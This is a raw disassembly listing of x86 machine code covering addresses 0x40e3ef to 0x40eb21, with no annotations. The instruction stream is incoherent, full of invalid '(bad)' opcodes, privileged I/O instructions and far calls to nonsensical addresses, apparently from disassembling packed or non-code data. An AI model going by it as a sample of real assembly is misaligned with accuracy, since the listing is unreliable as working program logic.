  40e3ef:	jl     0x40e3ff
  40e3f1:	sti    
  40e3f2:	mov    ds:0xb60f290e,eax
  40e3f7:	adc    eax,DWORD PTR [eax-0x47]
  40e3fa:	cmc    
  40e3fb:	sahf   
  40e3fc:	push   esi
  40e3fd:	jecxz  0x40e47a
  40e3ff:	jnp    0x40e463
  40e401:	hlt    
  40e402:	fdivp  st(6),st
  40e404:	fimul  DWORD PTR [esi-0x10541b49]
  40e40a:	retf   
  40e40b:	pop    ebx
  40e40c:	mov    eax,0xcda6e3a4
  40e411:	int    0x2d
  40e413:	enter  0xcc45,0x85
  40e417:	sub    DWORD PTR [esi-0x31],eax
  40e41a:	test   eax,0x4875b9b3
  40e41f:	inc    esi
  40e420:	inc    edx
  40e421:	or     edi,ebx
  40e423:	or     DWORD PTR [ebx+0x6cff640],ebp
  40e429:	bound  edi,QWORD PTR [esi+edx*2+0x4d]
  40e42d:	aad    0x5
  40e42f:	mov    esi,DWORD PTR [eax-0xfa25f04]
  40e435:	ret    
  40e436:	(bad)  [ecx+eiz*8]
  40e439:	mov    ebp,DWORD PTR [esi+ebp*2+0x46]
  40e43d:	pop    eax
  40e43e:	and    eax,0xa85d2ba7
  40e443:	sub    ah,BYTE PTR [esi+0x32]
  40e446:	les    ebx,FWORD PTR [edi-0x2b4d66e9]
  40e44c:	pushf  
  40e44d:	xchg   edi,eax
  40e44e:	enter  0xea24,0x1
  40e452:	jae    0x40e40a
  40e454:	in     eax,0xa9
  40e456:	inc    edi
  40e457:	arpl   WORD PTR [eax+edi*8-0x6fa311fa],di
  40e45e:	imul   esi,ebp,0x5c3b9bb
  40e464:	mov    bh,0xd8
  40e466:	imul   edi,DWORD PTR [ebp-0x1ef61df1],0xffffffc1
  40e46d:	nop
  40e46e:	pop    edi
  40e46f:	retf   0x4b46
  40e472:	add    DWORD PTR [ebx],0x5d
  40e475:	sti    
  40e476:	sub    al,0x46
  40e478:	fs push 0xffffffa9
  40e47b:	push   edx
  40e47c:	cli    
  40e47d:	mov    bh,0x48
  40e47f:	pop    ebp
  40e480:	push   0xbbecd8e3
  40e485:	xchg   DWORD PTR [ebx-0x11],edi
  40e488:	call   ecx
  40e48a:	rcr    BYTE PTR [ebp+eiz*4+0x6b11ae2b],0xc7
  40e492:	(bad)  
  40e493:	mov    edx,0x18dad18a
  40e498:	rcr    dh,1
  40e49a:	scas   eax,DWORD PTR es:[edi]
  40e49b:	mov    ds:0x1d8cff94,eax
  40e4a0:	in     eax,dx
  40e4a1:	push   ds
  40e4a2:	cdq    
  40e4a3:	xor    bh,dh
  40e4a5:	jmp    0x40e457
  40e4a7:	scas   al,BYTE PTR es:[edi]
  40e4a8:	js     0x40e4c9
  40e4aa:	bnd js 0x40e527
  40e4ad:	add    esi,esp
  40e4af:	adc    esi,DWORD PTR [ebx*2+0x71d1f7c9]
  40e4b6:	ficom  WORD PTR [esi+0xecab6d1]
  40e4bc:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4be:	scas   al,BYTE PTR es:[edi]
  40e4bf:	xchg   cl,dl
  40e4c1:	je     0x40e4c9
  40e4c3:	xor    eax,0xb42b9d53
  40e4c8:	jle    0x40e46f
  40e4ca:	cld    
  40e4cb:	xchg   BYTE PTR [ebp-0x2b09887f],bh
  40e4d1:	mov    ds:0x56701162,eax
  40e4d6:	mov    edi,0x51800869
  40e4db:	iret   
  40e4dc:	rcr    DWORD PTR [edi+0x4d],cl
  40e4df:	fisubr WORD PTR [ecx-0x15]
  40e4e2:	cmp    ecx,DWORD PTR [eax+0x19257972]
  40e4e8:	out    dx,eax
  40e4e9:	or     BYTE PTR [ebp+0x5d],ah
  40e4ec:	push   ss
  40e4ed:	imul   ebp,esp,0xb67bbf64
  40e4f3:	enter  0xe4cb,0x74
  40e4f7:	cmp    al,0xd1
  40e4f9:	in     eax,0x47
  40e4fb:	and    DWORD PTR [ebp-0x4d],esp
  40e4fe:	int    0xba
  40e500:	nop
  40e501:	and    al,0x3
  40e503:	adc    ecx,DWORD PTR [ecx-0x23]
  40e506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e507:	jp     0x40e4ef
  40e509:	mov    dh,0xb9
  40e50b:	inc    edi
  40e50c:	or     ebx,esi
  40e50e:	mov    esp,DWORD PTR [edi-0x1e]
  40e511:	ins    DWORD PTR es:[edi],dx
  40e512:	jnp    0x40e4ed
  40e514:	int    0x3f
  40e516:	mov    esi,0xda78c99
  40e51b:	jbe    0x40e546
  40e51d:	je     0x40e4ab
  40e51f:	push   ebx
  40e520:	pop    ebx
  40e521:	inc    ecx
  40e522:	std    
  40e523:	mov    esi,0x944277e1
  40e528:	and    dl,BYTE PTR cs:[ebx+0x35c8b296]
  40e52f:	pushf  
  40e530:	cmp    BYTE PTR [edi+0x18158019],ah
  40e536:	popa   
  40e537:	sbb    ch,BYTE PTR [edx+0x7b]
  40e53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e53b:	xor    eax,0xaf0ff1ae
  40e540:	mov    dl,0xb8
  40e542:	(bad)  
  40e544:	dec    edi
  40e545:	aas    
  40e546:	push   ebp
  40e547:	cmp    dh,bl
  40e549:	popf   
  40e54a:	mov    dl,0x5d
  40e54c:	shr    DWORD PTR [edx+0x13],0x6a
  40e550:	inc    ebp
  40e551:	aad    0xef
  40e553:	push   ds
  40e554:	push   eax
  40e555:	into   
  40e556:	lods   al,BYTE PTR ds:[esi]
  40e557:	mov    esi,0xe4559909
  40e55c:	jo     0x40e54b
  40e55e:	sar    DWORD PTR cs:[ebx+edi*2+0x1a],1
  40e563:	(bad)  
  40e564:	iret   
  40e565:	fidiv  DWORD PTR [esi-0x2d9fec2a]
  40e56b:	adc    ah,BYTE PTR [ebx]
  40e56d:	fs retf 
  40e56f:	dec    eax
  40e570:	mov    cl,0x5a
  40e572:	pop    ebp
  40e573:	cmp    dh,dh
  40e575:	jp     0x40e5d8
  40e577:	xor    ecx,DWORD PTR [edx+0x100c6a31]
  40e57d:	jne    0x40e506
  40e57f:	stos   BYTE PTR es:[edi],al
  40e580:	aas    
  40e581:	ds cld 
  40e583:	xchg   ecx,eax
  40e584:	pusha  
  40e585:	xchg   ebx,eax
  40e586:	fucom  st(6)
  40e588:	stos   DWORD PTR es:[edi],eax
  40e589:	std    
  40e58a:	in     eax,dx
  40e58b:	inc    edi
  40e58c:	mov    eax,0x58f494fb
  40e591:	popa   
  40e592:	mov    al,0xab
  40e594:	adc    ah,BYTE PTR [eax]
  40e596:	jle    0x40e543
  40e598:	mov    ecx,0x5a381832
  40e59d:	dec    ebp
  40e59e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e59f:	push   es
  40e5a0:	shr    ebp,0x90
  40e5a3:	cmp    BYTE PTR [eax],ch
  40e5a5:	enter  0x677b,0xf9
  40e5a9:	call   DWORD PTR [ebp+0x77d37cb4]
  40e5af:	dec    eax
  40e5b0:	stos   BYTE PTR es:[edi],al
  40e5b1:	mov    bl,0x34
  40e5b3:	sti    
  40e5b4:	dec    ebp
  40e5b6:	imul   eax,edi,0x6
  40e5b9:	mov    ebp,0xb9232cc4
  40e5be:	push   esi
  40e5bf:	push   edi
  40e5c0:	les    ebp,FWORD PTR ds:0x60e57fb6
  40e5c6:	cs pusha 
  40e5c8:	inc    esi
  40e5c9:	iret   
  40e5ca:	jne    0x40e5ec
  40e5cc:	inc    ebp
  40e5cd:	mov    bl,0x1
  40e5cf:	into   
  40e5d0:	pop    esi
  40e5d1:	(bad)  
  40e5d2:	jl     0x40e5a3
  40e5d4:	mov    dh,0xc6
  40e5d6:	lods   al,BYTE PTR ds:[esi]
  40e5d7:	xor    esi,ebx
  40e5d9:	and    ecx,ebp
  40e5db:	jecxz  0x40e5c2
  40e5dd:	ins    BYTE PTR es:[edi],dx
  40e5de:	inc    esi
  40e5df:	pop    ss
  40e5e0:	jb     0x40e56e
  40e5e2:	loopne 0x40e588
  40e5e4:	xchg   edi,eax
  40e5e5:	shl    eax,1
  40e5e7:	mov    dh,BYTE PTR [edi+0x549962db]
  40e5ed:	(bad)  
  40e5ee:	aam    0x7b
  40e5f0:	loope  0x40e61c
  40e5f2:	gs or  ecx,edi
  40e5f5:	or     ebx,DWORD PTR [ecx+0x17]
  40e5f8:	jns    0x40e631
  40e5fa:	cmp    ebx,DWORD PTR [eax+0x6]
  40e5fd:	(bad)  
  40e5fe:	sbb    eax,0x95917850
  40e603:	xchg   ebp,eax
  40e604:	adc    BYTE PTR [eax-0x76],cl
  40e607:	call   0x9e47fa60
  40e60c:	sbb    esp,esp
  40e60e:	xchg   ebp,eax
  40e60f:	mov    ch,BYTE PTR [eax]
  40e611:	addr16 clc 
  40e613:	mov    esp,0x9ba47fee
  40e618:	sub    DWORD PTR [ebx],eax
  40e61a:	dec    eax
  40e61b:	aaa    
  40e61c:	out    dx,al
  40e61d:	inc    BYTE PTR [ebx-0x534d0286]
  40e623:	xchg   ebp,eax
  40e624:	cmc    
  40e625:	je     0x40e648
  40e627:	jno    0x40e630
  40e629:	sti    
  40e62a:	or     ecx,DWORD PTR [eax]
  40e62c:	rcr    edi,0x71
  40e62f:	jnp    0x40e6a0
  40e631:	ror    BYTE PTR [esi-0x3a],cl
  40e634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e635:	retf   
  40e636:	std    
  40e637:	xchg   cl,cl
  40e639:	add    bh,BYTE PTR [ecx-0x16]
  40e63c:	gs sub eax,0xcae1e137
  40e642:	mov    eax,ds:0x99304345
  40e647:	in     al,dx
  40e648:	in     al,0xb6
  40e64a:	ficomp WORD PTR gs:[edx+esi*8]
  40e64e:	sbb    BYTE PTR [eax+0x6],al
  40e651:	mov    ebx,DWORD PTR [eax]
  40e653:	inc    esp
  40e654:	pop    esp
  40e655:	mov    esi,0x7bd3d728
  40e65a:	into   
  40e65b:	sbb    al,0xa
  40e65d:	mov    ds:0x8a438103,eax
  40e662:	outs   dx,DWORD PTR ds:[esi]
  40e663:	add    esp,DWORD PTR [ebp+0x1228cae9]
  40e669:	fs pop esp
  40e66b:	ss inc edi
  40e66d:	popf   
  40e66e:	push   ebx
  40e66f:	stc    
  40e670:	retf   0x128f
  40e673:	inc    ebx
  40e674:	push   ebx
  40e675:	xchg   esi,eax
  40e676:	jo     0x40e62c
  40e678:	mov    ds:0x86a8e705,ax
  40e67e:	mov    WORD PTR [edi-0x4b017c8a],es
  40e684:	jmp    DWORD PTR [eax]
  40e686:	fdivr  DWORD PTR [ebx+0x2e]
  40e689:	sub    eax,0x28630557
  40e68e:	or     BYTE PTR [ebp-0x1f3d4a0b],cl
  40e694:	imul   esp,ebp,0x55
  40e697:	inc    ebp
  40e698:	(bad)  
  40e699:	leave  
  40e69a:	jnp    0x40e633
  40e69c:	fwait
  40e69d:	ret    
  40e69e:	sbb    edi,DWORD PTR [ecx]
  40e6a0:	dec    esp
  40e6a1:	mov    BYTE PTR ds:0x794b6848,al
  40e6a7:	jbe    0x40e655
  40e6a9:	out    dx,al
  40e6aa:	shl    DWORD PTR [ebx],1
  40e6ac:	dec    edi
  40e6ad:	mov    cl,0x37
  40e6af:	cmp    eax,0xa199dcd3
  40e6b4:	jo     0x40e722
  40e6b6:	and    ecx,DWORD PTR [eax+0x28]
  40e6b9:	mov    al,0x6c
  40e6bb:	mov    ch,0xa2
  40e6bd:	add    al,0x95
  40e6bf:	pop    esi
  40e6c0:	pop    ecx
  40e6c1:	jns    0x40e67b
  40e6c3:	scas   al,BYTE PTR es:[edi]
  40e6c4:	xlat   BYTE PTR ds:[ebx]
  40e6c5:	dec    ecx
  40e6c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6c7:	ficomp WORD PTR [eax-0x510cebe6]
  40e6cd:	sub    al,al
  40e6cf:	and    DWORD PTR [ecx-0x11],ebx
  40e6d2:	and    ecx,ebx
  40e6d4:	add    BYTE PTR [esp+edi*4-0x2d01ae72],al
  40e6db:	aad    0x74
  40e6dd:	jle    0x40e6c7
  40e6df:	pop    ecx
  40e6e0:	xor    ebx,DWORD PTR [esi+0x14]
  40e6e3:	fistp  WORD PTR [eax]
  40e6e5:	stc    
  40e6e6:	mov    dl,0x12
  40e6e8:	aas    
  40e6e9:	cmp    DWORD PTR [ecx-0x23ef3f9c],ebp
  40e6ef:	ror    DWORD PTR ds:0x8dc37588,1
  40e6f5:	mov    edx,DWORD PTR [esi+eax*8]
  40e6f8:	cmp    al,0xf3
  40e6fa:	test   BYTE PTR [esi-0x5b],bh
  40e6fd:	or     BYTE PTR [edi-0x5c],0x82
  40e701:	adc    eax,0xd8cced13
  40e706:	or     DWORD PTR [eax+0x79],edi
  40e709:	cmp    eax,0x63abdea6
  40e70e:	inc    esp
  40e70f:	pop    esp
  40e710:	pop    esi
  40e711:	retf   
  40e712:	fidivr DWORD PTR [esi-0x6b]
  40e715:	inc    esp
  40e716:	bound  ebp,QWORD PTR [edx+esi*4-0x41]
  40e71a:	rcl    BYTE PTR [ebx+0x52279a99],0xf4
  40e721:	mov    bl,0xb8
  40e723:	fmul   st,st(7)
  40e725:	push   esp
  40e726:	inc    esi
  40e727:	or     BYTE PTR [edi-0x50],0x2e
  40e72b:	add    DWORD PTR ds:0xa923bbfa,0xffffffb8
  40e732:	shl    BYTE PTR [ebp-0x1f],1
  40e735:	jns    0x40e72c
  40e737:	ja     0x40e714
  40e739:	pop    edx
  40e73a:	jns    0x40e716
  40e73c:	sub    eax,0x4b4a7c9b
  40e741:	in     eax,dx
  40e742:	data16 jb 0x40e73e
  40e745:	and    DWORD PTR [ebp+0x53],edi
  40e748:	xchg   edx,eax
  40e749:	dec    edx
  40e74a:	je     0x40e6ef
  40e74c:	loopne 0x40e781
  40e74e:	inc    esi
  40e74f:	mov    ch,dl
  40e751:	or     eax,0xee157ea9
  40e756:	dec    eax
  40e757:	mov    DWORD PTR [edx-0x76471524],edx
  40e75d:	int3   
  40e75e:	pop    es
  40e75f:	push   0xe63cfb6d
  40e764:	daa    
  40e765:	clc    
  40e766:	mov    esi,0x70ff5489
  40e76b:	or     ebx,0x8684fa0e
  40e771:	(bad)  
  40e772:	push   ebx
  40e773:	bound  esp,QWORD PTR [ebp-0x3cfb7f33]
  40e779:	push   ebp
  40e77a:	adc    al,0xe6
  40e77c:	inc    edx
  40e77d:	mov    esp,0x4b0abd05
  40e782:	jle    0x40e737
  40e784:	fnstenv [ebp+0x7c9bbeae]
  40e78a:	xlat   BYTE PTR ds:[ebx]
  40e78b:	pop    ss
  40e78c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e78d:	cmp    DWORD PTR [ebp+edi*2-0x443e27c],esi
  40e794:	cmp    bl,0xe9
  40e797:	sub    eax,DWORD PTR [ecx]
  40e799:	add    ecx,esp
  40e79b:	gs dec edi
  40e79d:	bound  esi,QWORD PTR [edx]
  40e79f:	sub    ch,BYTE PTR [edx-0x74]
  40e7a2:	cdq    
  40e7a3:	call   0xcb3028c5
  40e7a8:	inc    ebp
  40e7a9:	mov    dh,0x91
  40e7ab:	lock std 
  40e7ad:	xchg   ebp,eax
  40e7ae:	adc    BYTE PTR [edx-0x6e],0x61
  40e7b2:	ret    
  40e7b3:	cmc    
  40e7b4:	in     al,dx
  40e7b5:	xor    BYTE PTR [edi],dh
  40e7b7:	ficomp DWORD PTR [edx+ebp*4-0x44]
  40e7bb:	cmp    DWORD PTR [edi*8-0x7f8e2c15],0xd1b730ea
  40e7c6:	ret    0x3311
  40e7c9:	js     0x40e75d
  40e7cb:	popf   
  40e7cc:	or     al,0x76
  40e7ce:	in     al,dx
  40e7cf:	mov    BYTE PTR [eax],bh
  40e7d1:	pop    ebx
  40e7d2:	xlat   BYTE PTR ds:[ebx]
  40e7d3:	out    dx,al
  40e7d4:	out    0x74,al
  40e7d6:	xor    al,0xce
  40e7d8:	mov    esi,0x591d57bd
  40e7dd:	xor    BYTE PTR [edx-0x33],ch
  40e7e0:	xchg   esi,eax
  40e7e1:	call   0xa900:0xdf735749
  40e7e8:	push   cs
  40e7e9:	fstp   TBYTE PTR [edx]
  40e7eb:	std    
  40e7ec:	xchg   ecx,eax
  40e7ed:	inc    eax
  40e7ee:	daa    
  40e7ef:	repz (bad) 
  40e7f1:	clc    
  40e7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f3:	push   esp
  40e7f4:	cmp    BYTE PTR [esi],0x3d
  40e7f7:	loopne 0x40e779
  40e7f9:	int    0x71
  40e7fb:	into   
  40e7fc:	or     eax,DWORD PTR [edx+0x60]
  40e7ff:	ins    BYTE PTR es:[edi],dx
  40e800:	mov    esp,0xd168c3ab
  40e805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e806:	ss mov eax,0x92751d74
  40e80c:	bound  ebp,QWORD PTR [esp+ebx*8+0x758830ad]
  40e813:	movntq QWORD PTR [edx-0x44],mm2
  40e817:	lods   eax,DWORD PTR ds:[esi]
  40e818:	and    ch,BYTE PTR [eax]
  40e81a:	dec    ecx
  40e81b:	js     0x40e7ab
  40e81d:	push   esi
  40e81e:	sbb    esi,DWORD PTR [ecx-0x21]
  40e821:	dec    ebp
  40e822:	xchg   ebp,eax
  40e823:	jno    0x40e7fc
  40e825:	mov    edi,0x10d0dd19
  40e82a:	loopne 0x40e874
  40e82c:	shl    BYTE PTR [edx+esi*1+0x21],0x5a
  40e831:	xchg   DWORD PTR [ecx+0x6],ebp
  40e834:	jne    0x40e81c
  40e836:	rcr    BYTE PTR [ebx+ebp*4],1
  40e839:	pop    DWORD PTR [edi+eax*8-0x5]
  40e83d:	sar    BYTE PTR cs:[edx-0x5e828fab],1
  40e844:	call   0x48ed:0x533e95a4
  40e84b:	mov    esp,DWORD PTR [esp+ebx*8-0x12]
  40e84f:	sar    BYTE PTR [ecx-0x3],cl
  40e852:	push   0x62645407
  40e857:	xor    dl,BYTE PTR [ecx-0x65]
  40e85a:	clc    
  40e85b:	ret    
  40e85c:	adc    ebp,esp
  40e85e:	stc    
  40e85f:	sti    
  40e860:	xor    DWORD PTR [esi-0x619c5bcd],ebp
  40e866:	push   edi
  40e867:	sbb    eax,0x46cf0967
  40e86c:	(bad)  [esi+0x2d]
  40e86f:	push   ss
  40e870:	scas   eax,DWORD PTR es:[edi]
  40e871:	cmp    ebp,esp
  40e873:	hlt    
  40e874:	jmp    0xcd3ed50c
  40e879:	imul   ebx,DWORD PTR [ecx],0xffffffad
  40e87c:	jo     0x40e827
  40e87e:	cmc    
  40e87f:	and    eax,0x69cc571b
  40e884:	addr16 es pop esp
  40e887:	push   ds
  40e888:	mov    esp,0xd6ffa267
  40e88d:	jge    0x40e884
  40e88f:	sbb    eax,0x7aa092d8
  40e894:	xchg   ecx,eax
  40e895:	enter  0x43b2,0x8
  40e899:	sub    edi,DWORD PTR [ecx+esi*8+0x1e]
  40e89d:	aad    0x9
  40e89f:	adc    DWORD PTR [ebx+0x5298ef6c],edx
  40e8a5:	lahf   
  40e8a6:	xchg   esp,eax
  40e8a7:	pop    eax
  40e8a8:	inc    eax
  40e8a9:	sbb    ah,BYTE PTR [esi]
  40e8ab:	cmp    al,0x86
  40e8ad:	mov    eax,0x7c857a09
  40e8b2:	mov    edx,0xc365d789
  40e8b7:	xchg   ebx,eax
  40e8b8:	cmp    DWORD PTR [ecx+edi*8],edx
  40e8bb:	call   0xbd6bbdc2
  40e8c0:	xchg   ebp,eax
  40e8c1:	xor    edx,DWORD PTR [edx]
  40e8c3:	push   esp
  40e8c4:	push   ds
  40e8c5:	jg     0x40e88c
  40e8c7:	loopne 0x40e889
  40e8c9:	pop    es
  40e8ca:	call   0x6ea0ec13
  40e8cf:	mov    ?,WORD PTR [edx+esi*4+0x25]
  40e8d3:	adc    al,0x44
  40e8d5:	fst    QWORD PTR [esi]
  40e8d7:	mov    ds:0xd04712a9,al
  40e8dc:	push   eax
  40e8dd:	gs pop eax
  40e8df:	ins    DWORD PTR es:[edi],dx
  40e8e0:	das    
  40e8e1:	retf   
  40e8e2:	dec    edi
  40e8e3:	jne    0x40e8b3
  40e8e5:	sbb    ecx,ebx
  40e8e7:	mov    ebx,0xf97d1c89
  40e8ec:	cmp    eax,0xde72c893
  40e8f1:	nop
  40e8f2:	jne    0x40e8aa
  40e8f4:	mov    eax,0x92622b97
  40e8f9:	jle    0x40e88f
  40e8fb:	out    0xc4,al
  40e8fd:	popa   
  40e8fe:	dec    ebp
  40e8ff:	je     0x40e8f6
  40e901:	mov    ecx,0x276aef2
  40e906:	adc    eax,0x35a22514
  40e90b:	mov    ebx,0x697313d1
  40e910:	aad    0x2f
  40e912:	imul   BYTE PTR [edx+0x5f998c00]
  40e918:	sub    al,0x3c
  40e91a:	(bad)  
  40e91b:	pop    ebx
  40e91c:	lods   al,BYTE PTR ds:[esi]
  40e91d:	ret    0xaadb
  40e920:	outs   dx,DWORD PTR ds:[esi]
  40e921:	mov    DWORD PTR [eax+0x5a],edi
  40e924:	lods   eax,DWORD PTR ds:[esi]
  40e925:	ja     0x40e976
  40e927:	jo     0x40e8d6
  40e929:	ins    DWORD PTR es:[edi],dx
  40e92a:	test   BYTE PTR [ebx+eax*4],ch
  40e92d:	dec    esi
  40e92e:	xchg   esi,eax
  40e92f:	int3   
  40e930:	lods   eax,DWORD PTR ds:[esi]
  40e931:	jno    0x40e8d2
  40e933:	iret   
  40e934:	hlt    
  40e935:	shl    DWORD PTR [eax],0xde
  40e938:	sub    al,0xc9
  40e93a:	and    dh,BYTE PTR [ebx]
  40e93c:	(bad)  
  40e93d:	mov    dl,0xc2
  40e93f:	cmp    ebp,eax
  40e941:	in     al,0xec
  40e943:	dec    eax
  40e944:	fwait
  40e945:	xchg   edx,eax
  40e946:	inc    ecx
  40e947:	test   eax,0xf8a3844c
  40e94c:	sub    BYTE PTR [edx],bl
  40e94e:	rcl    DWORD PTR [ebp-0x61c6d70c],1
  40e954:	dec    ecx
  40e955:	xlat   BYTE PTR ds:[ebx]
  40e956:	sar    esp,0xb3
  40e959:	push   edx
  40e95a:	jecxz  0x40e974
  40e95c:	leave  
  40e95d:	dec    ebx
  40e95e:	(bad)
  40e962:	(bad)  
  40e963:	dec    ebx
  40e964:	ins    DWORD PTR es:[edi],dx
  40e965:	mov    dl,cl
  40e967:	imul   ebx,ebx,0xffffffee
  40e96a:	data16 jae 0x40e9c6
  40e96d:	dec    esi
  40e96e:	or     al,0x4e
  40e970:	xchg   ebp,eax
  40e971:	clc    
  40e972:	xchg   esi,eax
  40e973:	xor    edx,ebx
  40e975:	lods   al,BYTE PTR ds:[esi]
  40e976:	mov    edx,0xcdb07205
  40e97b:	jmp    0x40e9c5
  40e97d:	bound  ebp,QWORD PTR [esp+edi*1-0x6e82de00]
  40e984:	hlt    
  40e985:	xchg   edx,eax
  40e986:	dec    ecx
  40e987:	div    BYTE PTR [esi+0x30ec5576]
  40e98d:	into   
  40e98e:	mov    cl,0x2
  40e990:	jle    0x40ea04
  40e992:	inc    ebx
  40e993:	das    
  40e994:	cdq    
  40e995:	dec    ebx
  40e996:	push   0xffffffb3
  40e998:	and    BYTE PTR [edi+0x4710fdc0],cl
  40e99e:	adc    al,0xd0
  40e9a0:	(bad)  
  40e9a1:	jb     0x40e9c7
  40e9a3:	push   ecx
  40e9a4:	jp     0x40e9ed
  40e9a6:	out    0x1e,al
  40e9a8:	ss mov ebx,0x569a65f0
  40e9ae:	std    
  40e9af:	pop    ss
  40e9b0:	lods   eax,DWORD PTR ds:[esi]
  40e9b1:	xchg   esp,eax
  40e9b2:	stos   DWORD PTR es:[edi],eax
  40e9b3:	mov    bl,0xdb
  40e9b5:	pop    esi
  40e9b6:	or     eax,0x779ca8e3
  40e9bb:	xchg   ebx,edx
  40e9bd:	scas   al,BYTE PTR es:[edi]
  40e9be:	mov    al,0xc5
  40e9c0:	add    dh,BYTE PTR [ebp-0x25]
  40e9c3:	jmp    FWORD PTR [edx-0x63]
  40e9c6:	icebp  
  40e9c7:	mov    ecx,0x704cdcc8
  40e9cc:	popa   
  40e9cd:	call   0xf70a:0x413e387a
  40e9d4:	repnz pop ebx
  40e9d6:	imul   edx,DWORD PTR [eax],0xfffffffc
  40e9d9:	div    BYTE PTR [eax]
  40e9db:	fcmovne st,st(5)
  40e9dd:	in     al,dx
  40e9de:	retf   0xf01f
  40e9e1:	lods   eax,DWORD PTR ds:[esi]
  40e9e2:	inc    esi
  40e9e3:	je     0x40e980
  40e9e5:	sahf   
  40e9e6:	cmp    DWORD PTR [esi-0x22],ebx
  40e9e9:	pop    ss
  40e9ea:	ds in  al,0x73
  40e9ed:	add    dh,BYTE PTR [ecx+0x14]
  40e9f0:	pop    ebp
  40e9f1:	or     ch,BYTE PTR [esi-0xe17129b]
  40e9f7:	clc    
  40e9f8:	dec    edx
  40e9f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9fa:	and    BYTE PTR [ebx+0x4b],dh
  40e9fd:	(bad)  
  40e9fe:	loope  0x40e9d3
  40ea00:	xchg   DWORD PTR [edx+0x21],ebx
  40ea03:	push   0x39f707e1
  40ea08:	out    0xc8,eax
  40ea0a:	pop    ds
  40ea0b:	hlt    
  40ea0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea0d:	sbb    ebx,esp
  40ea0f:	sbb    al,0xdf
  40ea11:	add    DWORD PTR [eax-0x5881be80],ebp
  40ea17:	popf   
  40ea18:	cmp    al,0x7a
  40ea1a:	push   eax
  40ea1b:	jp     0x40ea1b
  40ea1d:	leave  
  40ea1e:	cli    
  40ea1f:	sub    eax,edx
  40ea21:	sbb    al,0xb2
  40ea23:	call   0xa4fac2d4
  40ea28:	iret   
  40ea29:	fadd   QWORD PTR [ebx]
  40ea2b:	test   eax,0x4583f9fb
  40ea30:	lock jno 0x40ea15
  40ea33:	sub    ebp,0x6c
  40ea36:	(bad)  [ebx-0x65]
  40ea39:	ds mov eax,0x47bb97a3
  40ea3f:	xchg   BYTE PTR [ebx-0x70],ch
  40ea42:	mov    DWORD PTR [ecx],edx
  40ea44:	inc    edi
  40ea45:	jne    0x40e9f7
  40ea47:	iret   
  40ea48:	push   ebp
  40ea49:	das    
  40ea4a:	ret    
  40ea4b:	jg     0x40ea83
  40ea4d:	dec    edi
  40ea4e:	shr    DWORD PTR [esi-0x1e],cl
  40ea51:	in     al,0x83
  40ea53:	rcr    edi,1
  40ea55:	popa   
  40ea56:	mov    edx,0xa9ee282
  40ea5b:	ds add eax,0x136b972a
  40ea61:	outs   dx,BYTE PTR ds:[esi]
  40ea62:	xchg   ebx,eax
  40ea63:	ret    0x3f92
  40ea66:	or     eax,0xeedb9d2c
  40ea6b:	dec    ebx
  40ea6c:	daa    
  40ea6d:	jo     0x40ea45
  40ea6f:	and    al,0xb5
  40ea71:	lods   eax,DWORD PTR ds:[esi]
  40ea72:	clc    
  40ea73:	aas    
  40ea74:	les    edx,FWORD PTR [edx+eax*1]
  40ea77:	adc    dh,ah
  40ea79:	je     0x40ea5f
  40ea7b:	daa    
  40ea7c:	xchg   DWORD PTR [esi],ebp
  40ea7e:	push   esp
  40ea7f:	mov    eax,0x3da4727a
  40ea84:	or     ah,BYTE PTR [edi*1+0x7c487f54]
  40ea8b:	rdtsc  
  40ea8d:	aaa    
  40ea8e:	adc    ch,0xaf
  40ea91:	repnz inc esp
  40ea93:	jmp    0x6174974d
  40ea98:	(bad)  
  40ea99:	cld    
  40ea9a:	push   DWORD PTR [edx]
  40ea9c:	jo     0x40ea79
  40ea9e:	xlat   BYTE PTR ds:[ebx]
  40ea9f:	dec    ebp
  40eaa0:	inc    edx
  40eaa1:	mov    bl,0xe0
  40eaa3:	dec    ebx
  40eaa4:	xor    BYTE PTR [ebx+esi*8-0x5b],0xcf
  40eaa9:	push   ecx
  40eaaa:	xor    eax,0xcef72b76
  40eaaf:	sub    ch,BYTE PTR fs:[edi+0x63d29844]
  40eab6:	mov    al,ds:0xeb434339
  40eabb:	dec    edx
  40eabc:	lds    ecx,FWORD PTR [edx+0x49db3980]
  40eac2:	call   0x51f:0x23385b27
  40eac9:	imul   ebp,eax,0x9700c275
  40eacf:	mov    dl,0x39
  40ead1:	sbb    BYTE PTR [ebp+0x1e],dl
  40ead4:	gs mov bh,0x90
  40ead7:	dec    esp
  40ead8:	dec    edi
  40ead9:	cmp    dh,BYTE PTR ds:0x3528305d
  40eadf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eae0:	pop    ebx
  40eae1:	outs   dx,DWORD PTR ds:[esi]
  40eae2:	ins    DWORD PTR es:[edi],dx
  40eae3:	into   
  40eae4:	inc    edi
  40eae5:	shr    DWORD PTR [ecx+0x44c8933c],1
  40eaeb:	dec    ebp
  40eaec:	cmp    al,0x27
  40eaee:	push   es
  40eaef:	jne    0x40eab4
  40eaf1:	jae    0x40eb31
  40eaf3:	adc    DWORD PTR [ecx],esp
  40eaf5:	shl    BYTE PTR [edi],1
  40eaf7:	dec    ebp
  40eaf8:	jnp    0x40eab2
  40eafa:	iret   
  40eafb:	stos   BYTE PTR es:[edi],al
  40eafc:	sbb    al,0xf3
  40eafe:	pop    ecx
  40eaff:	test   DWORD PTR [ecx+0x466abcec],edi
  40eb05:	mul    BYTE PTR [eax-0x7e1ec1da]
  40eb0b:	cmp    bh,BYTE PTR [esi+0x6f]
  40eb0e:	aaa    
  40eb0f:	inc    ebp
  40eb10:	xor    al,0xfd
  40eb12:	pop    edx
  40eb13:	push   edx
  40eb14:	xchg   ebp,eax
  40eb15:	sahf   
  40eb16:	retf   
  40eb17:	dec    eax
  40eb18:	mov    edx,0x9c23a955
  40eb1d:	jl     0x40ead9
  40eb1f:	aaa    
  40eb20:	ret    
  40eb21:	nop
